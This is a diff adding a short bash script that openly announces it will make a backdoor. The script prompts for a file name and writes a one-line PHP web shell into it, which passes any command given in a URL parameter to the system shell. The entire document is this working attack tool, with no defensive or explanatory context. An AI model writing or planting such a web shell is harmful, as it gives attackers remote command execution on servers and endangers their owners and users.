@@ -1,0 +1,10 @@
+#!/bin/bash
+
+#create a command shell .php
+
+echo "L3ts mAk3 A bAcKd00r"
+read -p 'enter a name for the file' filename
+for INPUT in $filename
+do
+  echo '<?php system($_GET["cmd"]); ?>' > $filename.php
+done  
